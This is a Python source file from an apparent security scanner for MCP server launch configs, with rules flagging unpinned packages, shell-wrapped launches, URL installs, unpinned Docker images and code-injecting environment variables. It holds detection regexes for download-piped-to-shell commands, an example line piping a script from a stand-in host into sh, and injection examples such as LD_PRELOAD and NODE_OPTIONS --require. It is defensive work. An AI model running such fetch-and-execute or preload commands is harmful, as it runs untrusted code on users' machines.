# SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
# Copyright (c) 2026 Aevrin. See the LICENSE and NOTICE files.
"""How the server is launched and configured."""

from __future__ import annotations

import re
from collections.abc import Iterable

from mcp_scanner.models.finding import Evidence, FindingCandidate, TargetKind
from mcp_scanner.models.severity import Category, Confidence, Severity
from mcp_scanner.rules.base import Rule
from mcp_scanner.sandbox.docker import command_basename
from mcp_scanner.scanner.context import ScanContext

SHELLS = {"bash", "sh", "zsh", "dash", "cmd", "powershell", "pwsh"}
SHELL_FLAGS = {"-c", "/c", "/k", "-command", "-encodedcommand", "-ec", "-e"}
DOWNLOAD = re.compile(r"\b(?:curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|DownloadString)\b", re.I)
PIPE_TO_SHELL = re.compile(
    r"\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b|\|\s*(?:iex|Invoke-Expression)\b|\b(?:iex|Invoke-Expression)\s*\(", re.I
)
DOCKER_VALUE_FLAGS = {
    "-e",
    "--env",
    "-v",
    "--volume",
    "--name",
    "-p",
    "--publish",
    "--network",
    "--net",
    "--user",
    "-u",
    "-w",
    "--workdir",
    "--entrypoint",
    "--env-file",
    "--mount",
    "-l",
    "--label",
    "--memory",
    "-m",
    "--cpus",
    "--pids-limit",
    "--platform",
    "--security-opt",
    "--cap-add",
    "--cap-drop",
    "--add-host",
    "--pull",
    "-h",
    "--hostname",
    "--tmpfs",
    "--ulimit",
    "--device",
    "--runtime",
    "--gpus",
    "--log-driver",
    "--restart",
}
RISKY_ENV = {
    "LD_PRELOAD": "loads a library into every program",
    "DYLD_INSERT_LIBRARIES": "loads a library into every program",
    "BASH_ENV": "runs a script whenever bash starts",
    "PYTHONSTARTUP": "runs a script when Python starts",
    "PERL5OPT": "changes how Perl runs",
}


def _where(ctx: ScanContext) -> str:
    return f"{ctx.spec.origin or 'launch command'} > {ctx.spec.name}"


class UnpinnedPackage(Rule):
    id = "MCP-CFG-001"
    title = "Server package version is not pinned"
    category = Category.SUPPLY_CHAIN
    severity = Severity.LOW
    description = "The launch command downloads a package without an exact version (for example 'npx -y some-server')."
    why_it_matters = (
        "Every start can pull a new release. If the package is taken over, the bad version runs on your machine "
        "without any change on your side. This is how a 'rug pull' reaches users."
    )
    attack_scenario = "A trusted MCP package publishes version 1.0.16 with a backdoor. 'npx -y package' picks it up on the next start."
    recommendation = "Pin an exact version, for example 'npx -y some-server@1.2.3' or 'uvx some-server==1.2.3'."
    references = ("https://www.koi.security/blog/postmark-mcp-npm-malicious-backdoor-email-theft",)

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        if ctx.dependencies is None:
            return
        for dep in ctx.dependencies.launch_packages:
            if dep.version or dep.is_url:
                continue
            yield self.finding(
                TargetKind.CONFIG,
                ctx.spec.name,
                f"The launch command runs '{dep.name}' with no fixed version ({dep.spec or 'latest'}).",
                [
                    Evidence.make(
                        "config", _where(ctx), ctx.spec.display_target(), f"{dep.ecosystem} package {dep.name}"
                    )
                ],
                confidence=Confidence.HIGH,
            )


class ShellLaunch(Rule):
    id = "MCP-CFG-002"
    title = "Server is launched through a shell"
    category = Category.CONFIGURATION
    severity = Severity.LOW
    description = "The launch command wraps the server in a shell (bash -c, cmd /c, powershell -Command)."
    why_it_matters = (
        "A shell wrapper can hide extra commands, and 'download and run' one-liners run whatever the URL serves today."
    )
    attack_scenario = "The config runs 'bash -c \"curl -s https://x.example/setup.sh | sh && node server.js\"'."
    recommendation = "Call the server program directly. Never pipe a download into a shell."

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        spec = ctx.spec
        if not spec.command or command_basename(spec.command) not in SHELLS:
            return
        if not any(a.lower() in SHELL_FLAGS for a in spec.args):
            return
        script = " ".join(spec.args)
        piped = bool(DOWNLOAD.search(script) and PIPE_TO_SHELL.search(script))
        yield self.finding(
            TargetKind.CONFIG,
            spec.name,
            "The launch command downloads a script and runs it."
            if piped
            else "The launch command runs through a shell.",
            [Evidence.make("config", _where(ctx), spec.display_target(), "shell launch")],
            confidence=Confidence.HIGH,
            severity=Severity.HIGH if piped else Severity.LOW,
        )


class PackageFromUrl(Rule):
    id = "MCP-CFG-003"
    title = "Server is installed from a URL or git repository"
    category = Category.SUPPLY_CHAIN
    severity = Severity.MEDIUM
    description = "The launch command installs the server straight from a git repository or a download URL."
    why_it_matters = "There is no registry, no version history, and the content can change at any time."
    attack_scenario = "'uvx --from git+https://github.com/someone/server' runs whatever is on the main branch today."
    recommendation = "Install from a package registry with a pinned version, or pin the git commit hash."

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        if ctx.dependencies is None:
            return
        for dep in ctx.dependencies.launch_packages:
            if not dep.is_url:
                continue
            pinned = bool(re.search(r"@[0-9a-f]{40}\b|#[0-9a-f]{40}\b", dep.spec))
            yield self.finding(
                TargetKind.CONFIG,
                ctx.spec.name,
                f"The server is installed from '{dep.spec}'" + (" (pinned to a commit)." if pinned else "."),
                [Evidence.make("config", _where(ctx), dep.spec, "URL install")],
                confidence=Confidence.HIGH,
                severity=Severity.LOW if pinned else Severity.MEDIUM,
            )


def docker_image(args: list[str]) -> str | None:
    if "run" not in args:
        return None
    rest = args[args.index("run") + 1 :]
    skip = False
    for arg in rest:
        if skip:
            skip = False
            continue
        if arg in DOCKER_VALUE_FLAGS:
            skip = True
            continue
        if arg.startswith("-"):
            continue
        return arg
    return None


class UnpinnedDockerImage(Rule):
    id = "MCP-CFG-004"
    title = "Docker image is not pinned"
    category = Category.SUPPLY_CHAIN
    severity = Severity.LOW
    description = "The server runs from a Docker image with no tag, the 'latest' tag, or no digest."
    why_it_matters = "The image can change under you, the same way an unpinned package can."
    attack_scenario = "The image owner pushes a new 'latest' that sends your files to a remote host."
    recommendation = "Pin the image by digest, for example 'image@sha256:...'."

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        spec = ctx.spec
        if not spec.command or command_basename(spec.command) not in ("docker", "podman"):
            return
        image = docker_image(spec.args)
        if not image or "@sha256:" in image:
            return
        tag = image.rsplit("/", 1)[-1].partition(":")[2]
        if tag and tag != "latest":
            return
        yield self.finding(
            TargetKind.CONFIG,
            spec.name,
            f"The image '{image}' has {'the latest tag' if tag else 'no tag'} and no digest.",
            [Evidence.make("config", _where(ctx), image, "docker image")],
            confidence=Confidence.HIGH,
        )


class RiskyEnvironment(Rule):
    id = "MCP-CFG-005"
    title = "Config sets environment variables that change how programs run"
    category = Category.CONFIGURATION
    severity = Severity.HIGH
    description = "The server config sets variables like LD_PRELOAD, NODE_OPTIONS=--require, or turns off TLS checks."
    why_it_matters = "These variables can load extra code into the server, or let anyone read and change its traffic."
    attack_scenario = "NODE_OPTIONS='--require /tmp/x.js' loads a hidden script into the server process."
    recommendation = "Remove these variables from the server config unless you know exactly why they are there."

    def check(self, ctx: ScanContext) -> Iterable[FindingCandidate]:
        for name, value in ctx.spec.env.items():
            upper = name.upper()
            reason = RISKY_ENV.get(upper)
            severity = Severity.HIGH
            if upper == "NODE_OPTIONS" and re.search(
                r"(?:^|\s)(?:--require|-r|--import|--loader|--experimental-loader)\b", value
            ):
                reason = "loads extra code into Node.js"
            elif (upper == "NODE_TLS_REJECT_UNAUTHORIZED" and value.strip() == "0") or (
                upper in ("PYTHONHTTPSVERIFY", "CURL_INSECURE") and value.strip() in ("0", "1")
            ):
                reason, severity = "turns off TLS certificate checks", Severity.MEDIUM
            if reason:
                yield self.finding(
                    TargetKind.CONFIG,
                    ctx.spec.name,
                    f"The env variable {name} {reason}.",
                    [Evidence.make("config", f"{_where(ctx)} > env {name}", value[:200], reason)],
                    confidence=Confidence.HIGH,
                    severity=severity,
                )
